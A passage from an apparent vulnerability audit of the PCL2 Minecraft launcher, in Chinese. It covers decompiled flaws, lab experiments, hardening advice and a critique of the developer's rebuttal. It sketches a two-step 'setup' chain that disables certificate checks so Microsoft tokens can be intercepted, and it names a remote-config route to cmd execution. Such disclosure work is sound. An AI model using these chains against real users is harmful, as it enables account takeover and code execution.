- **修复建议**：改用 DPAPI（`ProtectedData.Protect(..., DataProtectionScope.CurrentUser)`）或 Windows Credential Manager；`Identify` 从日志中移除（或仅记录其哈希前缀）；删除硬编码默认密钥 `"@;$ Abv2"`。

---

#### PCL2-2026-07 隐藏设置 `ToolDownloadCert` 可安装"接受任意证书"回调（语义反转）

- **类型**：传输安全降级 / 隐藏后门式开关
- **严重程度**：🟡 中低（可升为中，取决于是否被主动利用）
- **源代码**：
  ```csharp
  // ① 设置项：无 UI、无读取点，仅注册了 OnChanged
  new Setting("ToolDownloadCert", false, Sources.Registry, Encrypted: false, a0 =>
  {
      ModNet.ShouldValidateSslCertificateOnLogin(Conversions.ToBoolean(a0));
  }),

  // ② 变更回调安装进程级证书策略
  public static void ShouldValidateSslCertificateOnLogin(bool Enabled)
  {
      ServicePointManager.ServerCertificateValidationCallback = (Sender, Certificate, Chain, Failure) =>
      {
          if (Failure == SslPolicyErrors.None) return true;
          Logger.Warn($"未通过 SSL 证书验证（{Failure}）...");
          if (req == null) return !Enabled;
          return (req.Address.Host.Contains("xboxlive") ||
                  req.Address.Host.Contains("minecraftservices")) && !Enabled;
      };
  }
  ```
- **说明（为什么这里存在漏洞）**：
  1. **语义反转**：设置名为 `ToolDownloadCert`（"工具下载证书"），直觉上 `true` 才是"放宽"。但回调逻辑是 `... && !Enabled`——**`false` 才意味着接受证书错误**。
  2. **它是"进程级"的，不是"单请求"的**：一旦安装，`ServicePointManager.ServerCertificateValidationCallback` 对整个进程内所有 `HttpWebRequest` 生效。
  3. **兜底分支写反了方向**：`if (httpWebRequest == null) return !Enabled;`——回调拿不到请求对象（例如走 `SslStream` 的路径）时**直接接受一切**，且**不限域名**。这是比"两个域"更宽的一条口子，属于"失败开放"（fail-open）的反模式。
  4. **域名判断的基准是 URI 主机，不是 `Host` 头**：回调取 `httpWebRequest.Address.Host`。而 PCL 的 `DNSLookup` 会把 URI 里的主机名改写成 IP（`mojang.com` / `minecraft.net` / `minecraftservices.com` 三个域在跳过名单里，不改写）。两者叠加的结果是：
     - `*.minecraftservices.com`：跳过 IP 改写 → `Address.Host` 是域名 → `Contains("minecraftservices")` 为真 → **放宽生效**；
     - `*.xboxlive.com`：不在跳过名单 → `Address.Host` 变成 IP → `Contains("xboxlive")` 恒为假 → **等于没放宽**。
     
     也就是说，实际受影响的只有 `minecraftservices` 一个域。这一点已用同款运行时 + 自签证书 + IP 直连形态实测确认（见 6.4）。
  5. **可被 `setup` 写入，且需要两步**：默认值是 `false` 且回调未安装；`Settings.Set` 只在**值发生变化**时才调用 `OnChanged`。因此需要先写 `true`（安装回调，此时 `Enabled=true`，仍严格校验），再写 `false`（再次安装，`Enabled=false`，放宽生效）。两条 `setup` 动作即可完成（`actions` 是数组，允许重复 `setup`）。
  6. **这是一条"自造前置条件"的路径**：作者的论证是"攻击者必须先能篡改 HTTPS"；而这个开关让"一次配置投递"就能**部分制造**这个能力，从而截获 XBL/XSTS/Minecraft 令牌。
  7. **无 UI、无文档、无默认写入**：正常用户永远不会碰它，因此它的存在只对攻击者有意义——这是"隐藏开关"最危险的形态。
- **可能的利用方法**：
  ```
  actions: [ { "setup": { "ToolDownloadCert": true } },
             { "setup": { "ToolDownloadCert": false } } ]
    → 安装进程级回调：*minecraftservices* 接受任意证书；非 HttpWebRequest 的调用一律接受
    → 用户下次微软账号登录：中间人出示自签证书即可截获令牌
  ```
- **可能的后果**：微软账号令牌被中间人截获（账号接管）；用户完全无感知。
- **修复建议**：删除该设置与对应回调；如确需兼容企业代理，改为"按 URL 显式豁免 + 弹窗告知 + 仅当次请求生效"，并禁止由 `setup` 写入任何 TLS 相关键。

---

#### PCL2-2026-08 低版本 Windows 下主动启用 SSL 3.0

- **类型**：协议降级
- **严重程度**：🟡 低危
- **源代码**：
  ```csharp
  if (Environment.OSVersion.Version < new Version(6, 2))     // < Windows 8
  {
      ServicePointManager.SecurityProtocol =
          SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls |
          SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
  }
  ```
- **说明**：在 Windows 7 等系统上，PCL 会**主动**把 SSL 3.0 加入启用列表。SSL 3.0 存在 POODLE（CBC 填充预言）等已知攻击，现代客户端普遍禁用。虽然服务端通常不会协商 SSLv3，但"客户端主动允许"意味着攻击者可强制降级（配合中间人）。
- **可能的利用方法**：在 Win7 目标上做中间人，强制协商 SSLv3 并利用 POODLE 解密部分流量。
- **可能的后果**：传输内容被部分解密（在已具备中间人能力前提下）。
- **修复建议**：移除 `Ssl3`；最低保留 `Tls12`；对老系统提示升级而非降级。

---

### 三-B、Backdoor（后门）判断的复核

前序报告用一整节讨论"火绒为何判 Backdoor"。本次反汇编可以给出更确定的结论，分三层：

**第一层：不是蓄意后门（证据充分）**

| 观察点 | 事实 |
|---|---|
| 符号与元数据 | 完全未混淆，`ModSecret`、`ServerSub`、`HasUpdatePermission` 原名保留 |
| 源码路径 | 编译期写入 `F:\Projects\...\ModSecret.vb`，模块归属一一对应 |
| 行为一致性 | 反编译逻辑与作者公开的 186 行源码**逐字对应**（仅变量名不同） |
| 隐藏载荷 | 无加密字符串、无隐藏 C2、无 `Assembly.Load(byte[])` 式内存加载、无计划任务/服务安装 |
| 自启动 | 无 `Run` 键写入、无服务注册（更新重启是显式 `Process.Start`） |
| 权限 | 不主动提权，无 UAC 绕过 |

结论：**没有任何"蓄意植入"的痕迹**。作者说明中"我若真想作恶，直接改更新包更简单"的论证，在技术上成立——而且本次核验发现更新包**确实无签名**，这句话反而更站得住。

**第二层：行为等价性仍然成立（这是火绒判定的来源）**

若只看行为特征，该模块具备：远端指令接收 → 动作分发执行 → 静默通道 → 自更新替换 → 自复制 → 稳定标识。这与 RAT/C2 的行为画像高度重合。**AV 的启发式不区分"意图"，只看"能力"**，因此火绒的判定在方法论上可解释，但不能作为"蓄意后门"的定性依据。

**第三层：本次修正——能力比前序报告描述的更强、更直接**

前序报告认为落地要经过 `{CDN}` 重定向与 `update.exe` 执行；实际上：
- `{CDN}` 只是签名，**不需要**它；
- 更新直接覆盖 exe，**不需要** `update.exe`；
- `setup` 可写 `LaunchAdvanceRun`，**连更新包都不需要**。

也就是说，"后门能力"的路径比前序报告设想的**更短**。这削弱了"攻击者要绕很多弯"的辩护，也强化了"该模块的能力边界应当被收紧"的建议。

**结论**：**非蓄意后门；但在服务端内容可控的威胁模型下，其能力与后门等价。** 两者并不矛盾——前者是关于"作者意图"的判断，后者是关于"代码能力"的判断。作者说明只回应了前者。

---

## 四、漏洞汇总表

| 编号 | 名称 | 类型 | 原评级 | 本次判定 | 本次评级 |
|---|---|---|---|---|---|
| PCL-RCE-001 | 无约束动作执行通道 | RCE | 🔴 | ✅ 成立 | 🔴 高危 |
| PCL-RCE-002 | setup 任意设置篡改 | 权限边界 | 🔴 | ⚠️ 部分成立 | 🔴 高危（机制改为"白名单含危险键"） |
| PCL-RCE-003 | 不安全更新机制 | RCE | 🔴 | ✅ 成立（更严重） | 🔴 高危 |
| PCL-SILENT-001 | 无 buttons 公告静默执行 | 远程控制 | 🔴 | ✅ 成立 | 🔴 高危 |
| PCL-DL-001 | 下载内容无完整性校验 | 缺少校验 | 🔴 | ✅ 成立 | 🔴 高危 |
| PCL-DOS-001 | stop 远程拒绝服务 | DoS | 🟠 | ✅ 成立 | 🟠 中危 |
| PCL-INFO-001 | 设备指纹外发 | 信息泄露 | 🟠 | ❌ **不成立** | —（撤销） |
| PCL-MITM-001 | TLS 校验可能禁用 | 中间人 | 🟠 | ❌ **不成立** | —（撤销） |
| PCL-PARSE-001 | 竖线分隔的位置解析 | 解析脆弱 | 🟠 | ✅ 成立 | 🟠 中危 |
| PCL-PARSE-002 | JSON 类型混淆 | 类型混淆 | 🟠 | ⚠️ 部分成立 | 🟠 中危 |
| PCL-HARD-001 | 硬编码远端地址 | 单点信任 | 🟠 | 🔽 成立（设计风险） | 🟠 中危 |
| PCL-CHAIN-001 | `{CDN}` + setup 链式 RCE | RCE | 🟠 | ❌ **不成立** | —（撤销） |
| PCL-FILE-001 | 不安全临时文件写入 | 文件竞态 | 🟡 | ⚠️ 部分成立 | 🟡 低危 |
| PCL-LOG-001 | 日志含远端原文 | 日志泄露 | 🟡 | 🔽 成立（泄露面修正） | 🟡 低危 |
| PCL-INFO-002 | FIPS 文案误导 | 信息 | ⚪ | ✅ 成立 | ⚪ 信息 |
| PCL-INFO-003 | Latest.exe 自复制 | 供应链 | ⚪ | ⚠️ 部分成立 | ⚪ 信息 |
| **PCL2-2026-01** | **setup → LaunchAdvanceRun → cmd /c** | **RCE/持久化** | — | ➕ 新增 | **🔴 高危** |
| **PCL2-2026-02** | **Link.Argument 命令行注入** | **参数注入** | — | ➕ 新增 | **🔴 高危** |
| **PCL2-2026-03** | **静默更新默认可用 + 仅 ≥1MB 校验** | **不安全更新** | — | ➕ 新增 | **🔴 高危** |
| **PCL2-2026-04** | **SystemSystemCache 目录可控** | **路径可控** | — | ➕ 新增 | **🟠 中危** |
| **PCL2-2026-05** | **硬编码 CurseForge API Key** | **硬编码凭据** | — | ➕ 新增 | **🟠 中危** |
| **PCL2-2026-06** | **DES-CBC 定 IV + Identify 入日志** | **密码学缺陷** | — | ➕ 新增 | **🟠 中危** |
| **PCL2-2026-07** | **ToolDownloadCert 语义反转** | **TLS 降级** | — | ➕ 新增 | **🟡 中低** |
| **PCL2-2026-08** | **低版本系统启用 SSL3** | **协议降级** | — | ➕ 新增 | **🟡 低危** |

> 统计：原 16 项 → 成立 7、部分成立 4、不成立 3、降级 2；新增 8 项（3 高、3 中、2 中低/低）。合计有效问题 **21 项**（撤销 3 项）。

---

## 五、加固建议

### P0（必须修，直接影响 RCE）

1. **为所有服务端内容引入签名与哈希**
   - `notice.json` / `ServerConfig.json` / `notice.cfg` / `update.zip` / `MsDelta` 补丁 / `EasyTier.zip` 全部使用 **ECDSA-P256（或 Ed25519）签名**，公钥内置二进制，私钥离线保管；
   - 下载链**接线**已有的 `FileChecker { Hash = SHA256 }`（能力现成，只需传参）；
   - 更新包额外校验 Authenticode 发布者。
2. **把 `setup` 改成"安全键白名单"**
   - 移除：`LaunchAdvanceRun`、`LaunchAdvanceJvm`、`LaunchAdvanceGame`、`CacheAuthServerServer`、`LoginType`、`SystemSystemCache`、`ToolDownloadCert`；
   - 只保留纯展示/纯开关类设置（如公告过滤、UI 偏好）。
3. **移除静默更新的硬编码旁路**
   - 删除 `HasUpdatePermission => true`；
   - `slientupdate` 改为"用户一次性显式授权 + 每次审计日志"。
4. **`Link.Argument` 结构化**
   - 不接受整串，改为键值白名单逐项校验后重新序列化；
   - `EasyTier.zip` 增加哈希校验。

### P1（重要，限制影响面）

5. `Identify` 从启动日志移除；凭据改用 DPAPI（`CurrentUser` 作用域）或 Credential Manager。
6. 删除 `ToolDownloadCert` 设置及进程级证书回调；如需企业代理兼容，改为按请求显式豁免 + 弹窗。
7. CurseForge Key 改服务端代理/短期令牌；`Url.Contains` 改 `Uri.Host` 精确匹配。
8. `SystemSystemCache` 增加路径校验（本地绝对路径、禁 UNC、禁系统目录）。

### P2（工程健壮性）

9. `notice.cfg` 改结构化格式（JSON / 键值对），替换 `Split("|")` 位置索引；`Val()` 改 `TryParse`。
10. 所有远端 JSON 增加 Schema 校验；`importantLevel` 等字段做范围约束，避免一条畸形公告打断整个公告循环。
11. 移除 `Ssl3`；对 `< Win8` 系统提示升级而非降级协议。
12. FIPS 提示文案修正为"系统已启用 FIPS 策略，可能导致部分算法不可用，建议关闭 FIPS 或升级 PCL"。

### P3（运营与可观测）

13. 服务器动作审计：记录动作名、来源、时间、客户端版本；异常批量动作告警。
14. 公告通道增加"动作类型白名单"：未来新增动作类型必须显式登记，未知动作不仅抛错，还应**上报并告警**（当前仅吞掉）。
15. CDN 增加多备用源 + 熔断；发布流程对"远程交互模块"设安全评审门禁。

---

## 六、实验过程与实验环境（完整记录）

### 6.1 实验环境

| 项目 | 值 |
|---|---|
| 操作系统 | Microsoft Windows 11 专业版，10.0.22631，64 位 |
| 主机 | Dell Pro Max Tower T2 FCT2250 |
| CPU 逻辑核 | 24 |
| PowerShell | 5.1.22621.2506（Desktop） |
| .NET Framework | 4.8（CLR `4.0.30319`，用于运行时实验，与 PCL 目标运行时一致） |
| .NET SDK | 8.0.426（`dotnet-install.ps1` 便携安装至 `re_work/dotnet`，不污染系统） |
| 反编译器 | `ilspycmd` 9.0.0.7889（ILSpy 官方 CLI） |
| 辅助解析 | Python 3.13.12 + `dnfile`（枚举 `ManifestResource`、定位内嵌 PE） |
| 工作目录 | `\PCL2\re_work` |
| 样本 | `Plain Craft Launcher 2.exe`，5,645,824 B，SHA-256 `0ab0b28a…f6577f` |

> 说明：最初尝试自建 PE/CLI 元数据解析器（`clr.py`），因工程量大、易引入解析误差而放弃，改为下载官方工具链。期间 `dnSpy.Console` 在无 TTY 环境下无法运行、NuGet 安装 `ilspycmd` 最新版失败，最终采用"便携 SDK + 指定版本 `ilspycmd`"的方案。

### 6.2 样本静态特征（排除加壳/混淆）

```
section   VA         VSize     RawSize   RawPtr
.text     0x00002000 0x005301a8 0x00530200 0x000200
.rsrc     0x00534000 0x00031fb4 0x00032000 0x00530400
.reloc    0x00566000 0x0000000c 0x00000200 0x00562400
```

- 单一 `.text` 承载全部 IL；`.rsrc` 存放内嵌程序集资源；
- 类型数 **501**，全量反编译 **88,510 行**；
- `PCL.ModSecret` 单独导出 **1,632 行**；
- 编译期源码路径常量完整保留，可作为方法归属证据；
- PE 时间戳为 `0xC6009B90`（非真实构建时间，疑为确定性构建产物），不作为版本判据。

### 6.3 实验步骤

| 步骤 | 操作 | 产出 / 结论 |
|---|---|---|
| 1 | 读取前序材料（公开源码、评估报告、教程） | 确定 16 项待验证假设、8 条待验证攻击链 |
| 2 | 静态侦察：节表、关键字符串计数、`MZ`/`PE` 扫描 | 排除加壳；确认 `ModSecret` 等符号以明文存在 |
| 3 | 工具链搭建 | .NET SDK 8.0.426 + ilspycmd 9.0.0.7889 可用 |
| 4 | 全量反编译 | `decomp/Plain Craft Launcher 2.decompiled.cs`（88,510 行 / 501 类型） |
| 5 | 定位 `PCL.ModSecret` | `-t "PCL.ModSecret"` 导出 `modsecret.cs`（1,632 行），锁定 `ServerSub`、`HasUpdatePermission`、`SecretCdnSign` |
| 6 | 枚举并提取内嵌程序集 | `dnfile` 读 `ManifestResource` + 扫描内嵌 PE，得 13 个镜像（`embedded/`） |
| 7 | 反编译关键依赖 | `MeloongCore`（`FileUtils` / `MsDelta` / `FileChecker`）、`PCLCS`；解开"外部符号不可见"的盲区 |
| 8 | 逐符号交叉验证 | `Settings.Set` 白名单、`OpenWebsite` 协议白名单、`ExtractToDirectory` 穿越防护、`UpdateReplace` 路径锚定、`Identify` 生成、`DNSLookup` |
| 9 | 运行时验证（TLS 基准） | 用 .NET Framework 4.8 构造正/反用例，证明 IP 改写不破坏证书校验 |
| 10 | 运行时验证（回调语义） | 自签证书 + 本地 HTTPS 服务，实测回调中 `Address.Host` 取到的是 IP 还是域名，据此确定 `ToolDownloadCert` 的实际覆盖面 |
| 11 | 结论收敛 | 16 项判定 + 8 项新增 + 攻击链重排 |

### 6.4 关键实验：`Host` 头与证书校验基准

这是第一个需要跑代码才能定论的问题，因为它决定了 PCL-MITM-001 是否成立。

**问题**：PCL 的 `DNSLookup` 会把 `https://host/path` 改写成 `https://<ip>/path` 并设置 `Host: host`。.NET Framework 的证书校验，是按 URI 里的 `<ip>` 还是按 `Host` 头？

**方法**：在同版本运行时（.NET Framework 4.8）构造两个用例，一个正确 `Host`、一个错误 `Host`：

```powershell
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$r = [System.Net.HttpWebRequest]::Create("https://104.20.23.154/")
$r.Host = "example.com"          # 或 "wrong-name.example"
$r.Timeout = 8000
try { $resp = $r.GetResponse(); "OK " + [int]$resp.StatusCode }
catch { "FAIL " + $_.Exception.GetBaseException().Message }
```

**结果**：

| 用例 | 观察 |
|---|---|
| `Host: example.com` | `OK 200` |
| `Host: wrong-name.example` | 失败：`未能创建 SSL/TLS 安全通道` |

**结论**：证书校验基准是 `Host` 头（SNI / 主机名），不是 URI 中的 IP 字面量。因此 PCL 的 IP 直连优化**不会**削弱证书校验，PCL-MITM-001 的前提不成立。

**边界说明**：该实验只验证 .NET Framework 4.8 的默认 `HttpWebRequest` 行为，未对 PCL 实际请求做抓包（避免向线上服务器发起真实请求）。

### 6.5 关键实验：证书回调里 `Address.Host` 到底是什么

这个实验决定 PCL2-2026-07 的**实际覆盖面**——回调写的是 `Address.Host.Contains("xboxlive") || ...Contains("minecraftservices")`，而 PCL 会把 URI 改写成 IP。所以必须先确认：回调里 `Address.Host` 取到的是**域名**还是**IP**？

**方法**：用自签证书起一个本地 HTTPS 服务（`re_work/tls_probe/server.py`，监听 `127.0.0.1:8443`），请求时把 `Host` 头设为 `api.minecraftservices.com`——这正是 PCL"IP 直连"后的报文形态；在回调里打印 `Address`、`Address.Host`、`Host` 头三个值。

```powershell
# 本地服务：Python + 自签证书
#   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 2 -nodes -subj "/CN=probe.local"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$cb = [System.Net.Security.RemoteCertificateValidationCallback]{
  param($s,$cert,$chain,$err)
  $req = $s -as [System.Net.HttpWebRequest]
  Write-Host "[CB] Address.Host = $($req.Address.Host)"
  Write-Host "[CB] HostHeader   = $($req.Host)"
  Write-Host "[CB] Contains(minecraftservices) = $($req.Address.Host.Contains('minecraftservices'))"
  return $true
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $cb
$r = [System.Net.HttpWebRequest]::Create("https://127.0.0.1:8443/")
$r.Host = "api.minecraftservices.com"
$r.GetResponse()
```

**结果**：

```
[CB] SenderType      = System.Net.HttpWebRequest
[CB] PolicyErrors    = RemoteCertificateNameMismatch, RemoteCertificateChainErrors
[CB] Address         = https://127.0.0.1:8443/
[CB] Address.Host    = 127.0.0.1
[CB] HostHeader      = api.minecraftservices.com
[CB] Contains(minecraftservices) = False
RESULT = OK 200
```

**结论**：回调判断的是 **URI 主机**，不是 `Host` 头。因此：

| 域名 | 是否在 `DNSLookup` 跳过名单 | 回调里 `Address.Host` | `Contains(...)` | 放宽是否生效 |
|---|---|---|---|---|
| `*.minecraftservices.com` | 在（不改写） | 域名 | `True` | **生效** |
| `*.xboxlive.com` | 不在（改写成 IP） | IP 字面量 | `False` | **不生效** |

也就是说，`ToolDownloadCert` 的实际覆盖面只有 `minecraftservices` 一个域，另加一条"回调拿不到 `HttpWebRequest` 时接受一切"的兜底分支。把它描述成"两个微软令牌域全线失守"会高估影响面。

**边界说明**：本实验复刻的是回调的**输入形态**（URI 为 IP、`Host` 头为域名），不是对 `api.minecraftservices.com` 做真实中间人；后者会触碰真实服务，本报告不做（见 6.7）。

### 6.6 可复现性

| 项 | 命令 / 说明 |
|---|---|
| 反编译全量 | `dotnet <ilspycmd.dll> -o decomp "Plain Craft Launcher 2.exe"` |
| 单类型导出 | `dotnet <ilspycmd.dll> -t "PCL.ModSecret" "Plain Craft Launcher 2.exe"` |
| 类型清单 | `dotnet <ilspycmd.dll> -l c "Plain Craft Launcher 2.exe"` |
| 内嵌程序集 | 用 `dnfile` 读 `ManifestResource`，或按 `MZ`+`PE\0\0` 特征扫描后按节表截断 |
| 样本校验 | `certutil -hashfile "Plain Craft Launcher 2.exe" SHA256` |

产物清单见附录 A。`re_work/` 合计约 733MB，其中便携 SDK 占 726MB，仅为运行 `ilspycmd` 所需；若不再复现可删除整个目录。

### 6.7 实验伦理与操作边界

- **未运行被测样本**：全程未启动 `Plain Craft Launcher 2.exe`，避免其向线上 CDN 发起真实请求、避免产生任何写操作。
- **未对官方服务做任何测试**：所有网络实验均针对 `example.com` 与其 IP，不涉及 `pcl2-server-1253424809.file.myqcloud.com`。
- **未修改样本**：仅读取，未 patch、未重打包。
- **未构造可用武器**：报告中不包含完整利用载荷，示例命令以占位形式给出。

---

## 七、对作者《有关 PCL 存在所谓"后门 / 漏洞"的说明》的评价

> 原文：B 站动态《有关 PCL 存在所谓"后门 / 漏洞"的说明》，龙腾猫跃，编辑于 2026-10-23 19:26。
> 链接：https://www.bilibili.com/opus/1262353478882164752
> 本节仅作技术讨论，不针对作者个人。

### 7.1 原文要点摘录（便于对照）

1. "经过调查，我已确认该功能不存在安全漏洞或后门"；"我从未收到过相关问题的 Issue 或 Security Advisory"。
2. 攻击步骤：攻击者需先"黑入或者掌握 PCL 的整个更新服务，或者已经能篡改用户电脑的文件或 HTTPS 链接"；然后"篡改 PCL 的更新服务下发的配置，把 PCL 的'启动前执行命令'设置，换成了他想执行的恶意代码"；"等待玩家自己去启动游戏"。
3. 三种前置可能：能篡改 HTTPS；能黑入 CDN；能篡改本地文件。
4. "如果把'软件可信服务向你推送恶意信息'作为漏洞的前置，你完全可以模拟任何一个软件的服务器……得出任何软件都存在后门的结论"。
5. "PCL 默认不在管理员权限下运行，提权操作也不触发联网配置执行代码。因此，即使文件被黑客修改也无法额外提升权限"。
6. 不是蓄意后门："任何程序本就可以修改其新版本更新包……完全没有必要设计一个如此迂回离奇的结构"。
7. 功能存在的原因：公告是更新的一部分；紧急情况下可在不发版的前提下关闭有漏洞的功能、修复崩溃死循环。
8. 后续：为部分设置修改添加黑名单；今后使用类似功能会公开发布通知。

### 7.2 合理的部分

**（1）威胁模型的主体判断基本正确，且与我的独立结论一致。**

原文说"攻击者需要先掌握更新服务、或能篡改 HTTPS、或能篡改本地文件"。我在完全独立的反汇编中得到的结论与此吻合：TLS 与主机名校验是**真实生效**的（3.1.3 的正/反用例），`{CDN}` 不可被重定向（3.1.3 的 PCL-CHAIN-001），因此"任意公网攻击者远程打穿"确实不成立。**在这一点上，前序报告的部分推断（尤其是 MITM 与 `{CDN}`）是错的，作者的判断是对的。**

**（2）"在这个前提下，攻击者本可以直接改更新包"——技术上完全站得住，而且被我的核验加强。**

我验证了更新链**无签名、无哈希、只校验 ≥1MB、直接覆盖 exe**。也就是说，能改 `ServerConfig.json` 的人本来就能把 exe 换掉。因此"公告通道没有带来新的能力"这个论点，**在"已掌握 CDN"这一类前置下是成立的**。这比很多厂商的辩解更有技术含量，因为它指向了一个真实的架构事实。

**（3）"不是蓄意后门"的论证成立。**

反汇编层面：无混淆、无隐藏 C2、无加密载荷、无服务/自启动注册、源码路径完整保留、动作语义与公开源码逐字对应。**没有任何"故意埋雷"的技术痕迹。** "有能力≠有意图"的逻辑，以及"真想作恶不如直接改更新包"的反证，都成立。

**（4）紧急熔断（kill switch）的价值是真实的。**

"老版本发现漏洞但用户关闭了更新，可通过公告关闭有漏洞的功能"——这是业界常见做法（浏览器组件更新、各类客户端的远程开关）。**问题不在于有这个通道，而在于这个通道的实现粒度太粗**：它不是"关闭某功能"的开关集合，而是一个能写任意白名单设置的通用解释器。这个区分很关键，作者的说明没有区分。

**（5）后续措施方向正确。**

"为部分设置加黑名单"正是我这份报告的 P0 建议之一（安全键白名单）。作者愿意在下一版落地，说明社区反馈起了作用，这一点应当肯定。

**（6）沟通姿态值得肯定。**

公开回应、附上未公开源码链接供二次核查、开放 Security Advisory 渠道、承诺今后使用该通道时公开通知——这些都是负责任的做法，比沉默或删帖好得多。

### 7.3 可以提出质疑的部分

**（1）"已确认不存在安全漏洞"这一结论过于绝对，且有若干问题与前序条件无关。**

以下 4 项**不需要** CDN 权限、不需要中间人，也能成立或被利用：

| 项 | 为何与"前置条件"无关 |
|---|---|
| PCL2-2026-03 `HasUpdatePermission => true` | 这不是"会不会被利用"，而是"静默更新的门根本不存在"。用户以为自己有确认权，实际没有。 |
| PCL2-2026-06 DES + `Identify` 入日志 | 只需拿到用户日志与本地配置文件；不涉及任何网络前置。 |
| PCL2-2026-05 硬编码 CurseForge Key | 任何人拿到 exe 即可提取；`Contains` 匹配还会把密钥发给非目标主机。 |
| PCL2-2026-07 `ToolDownloadCert` | 一个无 UI 的隐藏开关能让进程级 TLS 校验对微软令牌域失效——该缺陷本身无需任何外部条件即可认定（利用仍需一次内容投递）。 |

"没有收到 Advisory"是**流程事实**，不是**技术结论**。把前者当作后者的证据，是这份说明最主要的逻辑问题。

**（2）"不提权"回避了真实影响面。**

原文说"即使文件被黑客修改也无法额外提升权限"。这句话在"权限级别"上正确，但在"影响"上不成立：

- PCL 保管着**微软账号 AccessToken** 和第三方认证密码（`CacheMsAccess` / `LoginAuthPass`），以用户权限即可读取并解密（密钥材料就在日志里）；
- 用户级持久化（`HKCU\...\Run`、启动目录、`LaunchAdvanceRun` 本身）**不需要管理员**；
- 用户文档加密、浏览器凭据窃取、会话劫持，全部在用户权限内完成。

对启动器而言，**账号就是最高价值资产**，"不提权"并不能降低损失等级。

**（3）"任何软件都可被模拟服务器下发恶意指令"是错误类比。**

这个论证混淆了两件事：

- **普遍事实**：任何软件都信任自己的更新源——这一点我同意；
- **可避免的实现选择**：是否对下发内容做**签名**、是否把下发内容当成**通用指令集**来执行。

成熟更新链路的做法是：**更新包必须签名**（Authenticode / Ed25519 / 公钥内置），因此"CDN 被攻破"**不等于**"代码执行"。PCL 的 `FileChecker` **本来就支持 SHA-256**，只是更新链与公告链**从未传入 `Hash`**。这是"能力现成、没有接线"，不是"行业宿命"。因此"任何软件都这样"不成立：**很多软件不这样，而且这个软件自己就有不这样的能力。**

**（4）作者的威胁模型有一个自反性漏洞：这个通道可以"自己制造"它声称需要的前置条件。**

原文的前提是"攻击者必须先能篡改 HTTPS"。但 PCL2-2026-07 表明：`setup` 可以写入 `ToolDownloadCert`，进而在进程内安装一个对 `minecraftservices`（以及非 `HttpWebRequest` 调用）**接受任意证书错误**的回调。也就是说：

> "需要中间人能力" → 但这个通道可以先把"对微软令牌域的中间人免疫"关掉 → 从而**部分生成**它自己声称需要的前置条件。

这不是文字游戏，而是一条实际的两步 `setup` 链。它直接削弱了"前置条件不可自造"这一辩护的核心。

**（5）"各文件权限相同、无单文件操作 API"是风险集中，不是风险消除。**

原文用这一点说明"只改一个文件是不可能的"。但反过来读：**单点失陷 = 全量失陷**。而 2FA 保护的是"账号侧"，覆盖不到：存储桶策略配置错误、临时凭证泄露、内部人员、CI/CD 供应链、CDN 缓存投毒、以及（本次报告指出的）`sign` 密钥硬编码导致的可伪造 URL。这些都不需要登录控制台。

**（6）作者自己的攻击步骤描述，恰好确认了本次新增的 PCL2-2026-01。**

原文第 3–4 步："把 PCL 的'启动前执行命令'设置换成恶意代码 → 等待玩家启动游戏 → 执行"。这与我独立反汇编得到的 `setup → LaunchAdvanceRun → cmd.exe /c` **完全一致**。

也就是说，**技术机制双方没有分歧**；分歧只在"这算不算漏洞"。而这恰恰说明：`LaunchAdvanceRun` 出现在 `setup` 可写白名单里，是一个**可被单方面收紧的设计选择**，而不是不可避免的架构后果。作者随后承诺"为部分设置加黑名单"，实际上也默认了这一点。

**（7）"未收到 Advisory"的可达性问题应当双向看待。**

作者自述"GitHub 账号均已被封禁"，只能通过 B 站发布说明。这客观上削弱了 Security Advisory 渠道的可达性与可信度。**这既解释了沟通为何断裂，也说明"未收到"不能作为"不存在"的证据。** 反过来，研究者也应当尽量走私下渠道——这一点我接受，并在本报告第八节作出承诺。

**（8）时间线：该版本（也是不选择更新的用户使用最多的版本）不存在修复的可能性。**

说明称"会随下一个版本发放"设置黑名单；而本次样本 2.13.0.1（VersionCode 406）**尚不存在任何动作/设置黑名单**（`Settings.Set` 只有 `Entries` 功能白名单）。因此本报告针对的版本仍处于未修复状态，结论具有现实意义。

### 7.4 综合评价

| 维度 | 评价 |
|---|---|
| 威胁模型 | **基本正确**。三类前置条件判断成立；但遗漏了"通道可自造前置条件"（PCL2-2026-07）。 |
| 技术事实 | **部分正确**。TLS、`{CDN}`、无蓄意后门等判断与反汇编一致；"不存在安全漏洞"过于绝对。 |
| 论证结构 | **有滑坡**。用"前置条件苛刻"推出"不是漏洞"；用"没收到报告"推出"不存在问题"。 |
| 影响评估 | **偏乐观**。以"不提权"淡化影响，未计入账号令牌与用户级持久化。 |
| 态度与处置 | **积极**。公开回应、提供源码、承诺黑名单与通知机制。 |

一句话：**这份说明在"不是蓄意后门""前置条件确实苛刻"两点上站得住；在"不存在安全漏洞""任何软件都如此""不提权就影响有限"三点上站不住。** 前者值得尊重，后者需要用本报告的事实来修正。

---

## 八、免责声明（善意白帽子声明）

本材料由独立安全研究者以**善意白帽（Good-faith White Hat）**身份编写并提交，声明如下：

**1. 目的**

仅用于提升 PCL2 启动器及其用户的安全水平。不含任何抹黑、贬损、引流、商业竞争或人身攻击意图。报告中所有批评均指向**代码与设计**，不指向作者个人。

本人自2008年以来就高度关注国内的Minecraft社区，提交这份材料的目的，是出于对国内几百万（甚至可能上千万）Minecraft玩家设备安全的高度担忧。**对于如此庞大数量级的社区，其定位为“社区基建”的PCL启动器绝不容许出现如此多、如此密集、如此高危的漏洞。**长期以来存在的安全隐患，于2026年10月21~23日PCL官方服务器遭受大规模DDoS攻击而爆发。

网络安全属于本人的业余爱好，技术实力有限，报告中难免存在分析不当甚至错误之处。本人愿意接受对这份报告的技术批评与建议，并在认可自己存在的技术错漏后第一时间进行更正。

**2. 授权与合法性**

- 分析对象为**公开发布、可自由下载**的软件副本，获取方式合法；
- 全程仅做**静态分析**（反编译、字符串与元数据检查）与一处**本地运行时实验**（针对 `example.com`）；
- **未**对 PCL 官方服务器、CDN、API 发起任何未授权测试、扫描、探测或压测；
- **未**侵入任何计算机信息系统，**未**获取任何未授权数据，**未**干扰任何服务的正常运行；
- **未**修改、重打包、传播被分析样本；
